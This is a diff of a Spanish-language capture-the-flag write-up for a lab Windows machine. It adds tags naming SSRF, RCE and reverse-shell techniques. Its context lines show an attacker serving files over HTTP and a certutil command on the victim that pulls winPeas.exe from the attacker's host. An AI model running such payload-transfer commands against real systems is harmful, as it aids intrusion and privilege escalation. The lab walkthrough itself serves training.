@@ -1,5 +1,7 @@
 ## Summary
 
+Tags: #Windows #HTTP #HTTPS #SSRF #RCE #ReverShell #WinPEAS #Msfvenom 
+
 - IP -> 10.10.10.239
 - Ports -> TCP (80,135,139,443,445,3306,5000,5040,5985,7680,47001,), UDP (idk)
 - OS ->  Windows 
@@ -96,7 +98,6 @@ Podemos usar la herramienta **Winpeas** en el sistema Windows. Nos dirigimos en 
 
 Lo traemos a nuestra ruta de trabajo y nos creamos un servidor para poder subirlo a la maquina victima
 ❯ **python3 -m http.server 80** Una vez guardado lo tenemos que transferir a la maquina victima y para ello nos montamos un servidor http 80.
-
 
 Despues en la maquina victima Windows le decimos que queremos cargar un archivo.
 ❯ **certutil.exe -f -urlcache -split \http://10.10.14.2/winPeas.exe winPeas.exe**
